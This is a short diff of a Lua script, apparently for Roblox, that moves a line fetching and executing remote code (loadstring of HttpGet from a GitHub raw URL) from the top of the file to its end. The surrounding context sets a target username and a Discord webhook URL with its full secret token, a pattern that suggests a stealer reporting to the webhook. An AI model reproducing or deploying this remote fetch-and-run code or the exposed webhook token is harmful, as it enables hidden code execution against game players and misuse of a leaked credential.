@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/HuiScripts/odh/refs/heads/main/Loading"))()
 userName = "SolaZola_1"
 webHook = "https://discord.com/api/webhooks/1322566636586405918/-Nm7RjBNFAxM7TTwlmzwqMvCOnKxSCHY-cJH49F5hxeB2-l1drDxVsPqu2D4MJq_34Sp"
 
@@ -1188,3 +1187,4 @@ game.Players.PlayerAdded:Connect(function(player)
         end)
     end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HuiScripts/odh/refs/heads/main/Loading"))()
